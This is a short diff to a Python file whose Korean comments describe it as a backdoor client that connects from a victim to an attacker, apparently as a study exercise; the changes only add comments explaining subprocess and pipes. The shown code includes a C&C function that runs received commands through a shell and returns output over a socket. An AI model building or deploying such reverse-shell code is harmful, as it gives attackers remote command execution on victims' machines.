@@ -1,6 +1,7 @@
 # client
 # 클라이언트가 서버로 연결을 시도하는 코드
 # 즉 피해자가 공격자 측으로 연결을 시도하는 악성코드 또는 백도어라고 볼 수 있다.
+
 import socket
 import subprocess
 import os
@@ -34,10 +35,10 @@ def connect_cnc(s):
         except Exception as e:
             s.send(str(e).encode("euc-kr", "ignore"))
 
-        proc = subprocess.Popen(
+        proc = subprocess.Popen(   #Subprocess 모듈은 새로운 프로세스를 생성 및 관리함
             command,
             shell=True,
-            stdout=subprocess.PIPE,
+            stdout=subprocess.PIPE, #PIPE 는 프로세스 간 통신할 수 있는 통로라고 생각하자
             stderr=subprocess.PIPE,
             stdin=subprocess.PIPE,
         )
